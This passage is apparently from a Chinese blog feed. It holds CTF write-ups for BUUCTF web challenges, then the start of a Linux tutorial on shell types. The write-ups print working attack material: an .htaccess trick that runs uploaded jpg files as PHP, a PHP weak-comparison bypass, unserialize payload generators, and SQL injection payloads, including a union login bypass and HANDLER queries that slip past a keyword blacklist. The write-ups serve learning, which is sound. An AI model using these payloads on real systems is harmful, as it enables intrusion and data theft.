以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。概述来说，<a href="http://www.lvjiyong.com/tag/htaccess/">htaccess</a>文件是<a href="http://www.lvjiyong.com/tag/apache/">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。详细讲解见：<a href="https://blog.csdn.net/cmzhuang/article/details/53537591">https://blog.csdn.net/cmzhuang/article/details/53537591</a></p><p>我们需要用到的就是下面这个，所有jpg文件都会被当作php文件执行：</p><pre class="line-numbers language-none"><code class="language-none">ForceType application/x-httpd-phpSetHandler application/x-httpd-php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里在上传配置文件时注意抓包修改<code>Content-Type: image/jpeg</code>，否则上传不了：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202070953868.png"></p><p>之后直接连接jpg文件就可以了，flag在根目录：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202070953870.png"></p><h2 id="27-MRCTF2020-Ez-bypass"><a href="#27-MRCTF2020-Ez-bypass" class="headerlink" title="27.[MRCTF2020]Ez_bypass"></a>27.[MRCTF2020]Ez_bypass</h2><p>这题比较简单，就是弱比较。直接给payload：/?gg[]=1&amp;id[]=2。然后post的数据为：passwd=1234567a😉</p><h2 id="28-网鼎杯-2020-青龙组-AreUSerialz"><a href="#28-网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="28.[网鼎杯 2020 青龙组]AreUSerialz"></a>28.[网鼎杯 2020 青龙组]AreUSerialz</h2><p>读源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Hello World!"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token shell-comment comment">#这里是弱比较</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">op</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">op</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"[Result]: &lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token shell-comment comment">#这个是强比较,可以绕过！</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">op</span> <span class="token operator">===</span> <span class="token double-quoted-string string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">op</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token shell-comment comment">#这里检查是不是有不符合的ASCII码字符</span><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">{</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思路很简单首先让<code>op = 2</code>，这样就通过了强比较并且绕过了弱比较。这里有一个不同的就是属性都是<code>protect</code>：</p><p>private属性序列化的时候会引入两个\x00，注意这两个\x00就是ascii码为0的字符。这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得很清楚了。同理，protected属性会引入\x00*\x00。</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202080954986.png"></p><p>下面有两种方法可以绕过，第一种就是，可以在序列化内容中用<strong>大写S表示字符串</strong>，此时这个字符串就支持<strong>将后面的字符串用16进制表示</strong>：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span><span class="token keyword">protected</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$content</span> <span class="token operator">=</span><span class="token double-quoted-string string">""</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$A</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$B</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$A</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$C</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'%00'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\\00'</span><span class="token punctuation">,</span> <span class="token variable">$B</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$D</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'s'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'S'</span><span class="token punctuation">,</span><span class="token variable">$C</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$D</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BS%3A0%3A%22%22%3B%7D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另一种就是PHP7.1以上版本对属性类型不敏感，public属性序列化不会出现不可见字符，可以用public属性来绕过：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$op</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Hello World!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:12:"Hello World!";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传进去查看源码就得到flag了。</p><h2 id="29-GXYCTF2019-BabySQli"><a href="#29-GXYCTF2019-BabySQli" class="headerlink" title="29.[GXYCTF2019]BabySQli"></a>29.[GXYCTF2019]BabySQli</h2><p>这个SQL注入和之前的不太一样，考察的是联合注入。源码地址：<a href="https://github.com/imagin-sch/GXY_CTF/tree/master/Web/BabySqli">https://github.com/imagin-sch/GXY_CTF/tree/master/Web/BabySqli</a></p><p>首先读取源码看到search.php,打开看到一段字符串：<code>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</code>，这个不是base64哦，这个是base32，这里讲一下大致区别：</p><ul><li>base32 只有大写字母和数字数字组成，或者后面有三个等号。</li><li>base64 只有大写字母和数字，小写字母组成，后面一般是两个等号。</li></ul><p>所以先base32解密然后base64解密，得到：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from user where username = '$name'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到这个直接告诉我们是从<code>user</code>表中读取信息，并且是根据<code>username</code>的字段值。</p><p>开始尝试注入，发现只有username为admin时才不会显示wrong user ，说明只能是admin，下面就是利用联合注入的一个特点：<font color="#FF5E3A" size="3">联合查询所查询的数据不存在时，联合查询会构造一个虚拟的数据</font>。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select * from salaries;+--------+--------+------------+------------+| emp_no | salary | from_date  | to_date    |+--------+--------+------------+------------+|  10001 |   5000 | 1986-06-26 | 9999-01-01 ||  10002 |   5100 | 1996-08-03 | 9999-01-01 ||  10003 |   5200 | 1995-12-03 | 9999-01-01 ||  10004 |   5300 | 1986-12-01 | 9999-01-01 ||  10005 |   5400 | 1989-09-12 | 9999-01-01 ||  10006 |   5500 | 1990-08-05 | 9999-01-01 ||  10007 |   5600 | 1989-02-10 | 9999-01-01 ||  10008 |   5700 | 1998-03-11 | 2000-07-31 ||  10009 |   5800 | 1985-02-18 | 9999-01-01 ||  10010 |   5900 | 1996-11-24 | 2000-06-26 ||  10010 |   6000 | 2000-06-26 | 9999-01-01 ||  10011 |   6100 | 1990-01-22 | 1996-11-09 ||  10012 |   5000 | 1992-12-18 | 9999-01-01 ||  10013 |   5100 | 1985-10-20 | 9999-01-01 ||  10014 |   5200 | 1993-12-29 | 9999-01-01 ||  10015 |   5300 | 1992-09-19 | 1993-08-22 ||  10016 |   5400 | 1998-02-11 | 9999-01-01 ||  10017 |   5500 | 1993-08-03 | 9999-01-01 ||  10018 |   5700 | 1987-04-03 | 1992-07-29 ||  10018 |   5600 | 1992-07-29 | 9999-01-01 ||  10019 |   5800 | 1999-04-30 | 9999-01-01 ||  10020 |   5900 | 1997-12-30 | 9999-01-01 ||  10021 |   6000 | 1988-02-10 | 2002-07-15 ||  10022 |   6100 | 1999-09-03 | 9999-01-01 ||  10023 |   5000 | 1999-09-27 | 9999-01-01 ||  10024 |   5100 | 1998-06-14 | 9999-01-01 ||  10025 |   5200 | 1987-08-17 | 1997-10-15 ||  10026 |   5300 | 1995-03-20 | 9999-01-01 ||  10027 |   5400 | 1995-04-02 | 9999-01-01 ||  10028 |   5500 | 1991-10-22 | 1998-04-06 ||  10029 |   5600 | 1991-09-18 | 1999-07-08 ||  10029 |   5700 | 1999-07-08 | 9999-01-01 ||  10030 |   5800 | 1994-02-17 | 9999-01-01 |+--------+--------+------------+------------+33 rows in set (0.00 sec)mysql&gt; select * from salaries where emp_no=10001 union select 999,9999,2022-02-09,9999-01-01;+--------+--------+------------+------------+| emp_no | salary | from_date  | to_date    |+--------+--------+------------+------------+|  10001 |   5000 | 1986-06-26 | 9999-01-01 ||    999 |   9999 | 2011       | 9997       |+--------+--------+------------+------------+2 rows in set (0.00 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到自己构造的数据已经显示出来了。但是再次读取数据的时候就没了，只是<strong>本次</strong>的临时虚拟数据。</p><p>接下来就可以直接构造拿flag了：</p><pre class="line-numbers language-none"><code class="language-none">name:1' union select 1,'admin','202cb962ac59075b964b07152d234b70'#password:123#其中202cb962ac59075b964b07152d234b70是md5(123)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里有个疑问为什么可以知道要md5加密？？？</p><h2 id="30-GYCTF2020-Blacklist"><a href="#30-GYCTF2020-Blacklist" class="headerlink" title="30.[GYCTF2020]Blacklist"></a>30.[GYCTF2020]Blacklist</h2><p>这道题和强网杯之前的随便注几乎一样，不同的就是最后一步。考察的是<font color="#FF5E3A" size="3">联合注入</font>和<font color="#FF5E3A" size="3">Handler命令</font>。</p><p>前面的注入命令如下：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' order by 2#1';show tables;#1';show columns from FlagHere;#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果你用到了select，会发现过滤了什么：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i"</span><span class="token punctuation">,</span><span class="token variable">$inject</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里就到了难点，我们不能用select，屏蔽了大小写绕过等。这里就考察了在<font color="#FF5E3A" size="3">Mysql中</font>的一个等价命令<code>handler</code>，先看看这个的语法：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。HANDLER tbl_name OPEN [ [AS] alias] #通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]#通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }    [ WHERE where_condition ] [LIMIT ... ]#通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。HANDLER tbl_name READ { FIRST | NEXT }    [ WHERE where_condition ] [LIMIT ... ]#关闭句柄HANDLER tbl_name CLOSE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来具体展示一下：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; show tables from test;+----------------+| Tables_in_test |+----------------+| departments    || dept_emp       || dept_manager   || employees      || salaries       |+----------------+5 rows in set (0.00 sec)mysql&gt; handler salaries open;Query OK, 0 rows affected (0.00 sec)mysql&gt; handler salaries read first;+--------+--------+------------+------------+| emp_no | salary | from_date  | to_date    |+--------+--------+------------+------------+|  10001 |   5000 | 1986-06-26 | 9999-01-01 |+--------+--------+------------+------------+1 row in set (0.00 sec)mysql&gt; handler salaries close;Query OK, 0 rows affected (0.00 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就可以构造payload得到flag：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054294.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习-第五章</title>
      <link href="/posts/myh10011.html"/>
      <url>/posts/myh10011.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="五、理解shell"><a href="#五、理解shell" class="headerlink" title="五、理解shell"></a>五、理解shell</h2><h3 id="5-1-shell-的类型"><a href="#5-1-shell-的类型" class="headerlink" title="5.1 shell 的类型"></a>5.1 shell 的类型</h3><p>系统启动什么样的shell程序取决于你个人的用户ID配置。在<code>/etc/passwd</code>文件中，在用户ID记录的第7个字段中列出了默认的shell程序。只要用户登录到某个虚拟控制台终端或是在GUI中启动终端仿真器，<strong>默认的shell程序就会开始运行</strong>。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> /etc/passwdlighthouse:x:1000:1000::/home/lighthouse:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>bash shell程序位于/bin目录内。从长列表中可以看出<code>/bin/bash</code>（ bash shell）是一个<strong>可执行程序</strong>：  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ls -lF /bin/bash</span>-rwxr-xr-x <span class="token number">1</span> root root <span class="token number">1168776</span> Apr <span class="token number">18</span>  <span class="token number">2019</span> /bin/bash*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>默认的交互shell</strong>会在用户登录某个虚拟控制台终端或在GUI中运行终端仿真器时启动。不过还有另外一个默认shell是<code>/bin/sh</code>，它作为默认的<strong>系统shell</strong>，用于那些需要在启动时使用的系统shell脚本。  </p><p>经常会看到某些发行版使用<strong>软链</strong>接将默认的系统shell设置成bash shell：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ls -lF /bin/sh</span>lrwxrwxrwx <span class="token number">1</span> root root <span class="token number">4</span> Nov <span class="token number">25</span> <span class="token number">15</span>:30 /bin/sh -<span class="token operator">&gt;</span> bash*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>有些发行版上，默认的系统shell和默认的交互shell并不相同：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> /etc/passwd<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>christine:x:1000:1000:Christine,,,:/home/christine:/bin/bash$$ <span class="token function">ls</span> -l /bin/shlrwxrwxrwx <span class="token number">1</span> root root <span class="token number">4</span> Apr <span class="token number">22</span> <span class="token number">12</span>:33 /bin/sh -<span class="token operator">&gt;</span> dash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-2-shell-的父子关系"><a href="#5-2-shell-的父子关系" class="headerlink" title="5.2 shell 的父子关系"></a>5.2 shell 的父子关系</h3><p>用于登录某个虚拟控制器终端或在GUI中运行终端仿真器时所启动的默认的交互shell，是一个<strong>父shell</strong>。  在CLI提示符后输入<code>/bin/bash</code>命令或其他等效的<code>bash</code>命令时， 会创建一个新的shell程序。这个shell程序被称为<strong>子shell（ child shell）</strong>。子shell也拥有CLI提示符，同样会等待命令输入。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># ps -f</span><span class="token environment constant">UID</span>        PID  <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMDroot      <span class="token number">8068</span>  <span class="token number">8050</span>  <span class="token number">0</span> <span class="token number">19</span>:48 pts/0    00:00:00 -bashroot     <span class="token number">12611</span>  <span class="token number">8068</span>  <span class="token number">0</span> <span class="token number">20</span>:06 pts/0    00:00:00 <span class="token function">ps</span> 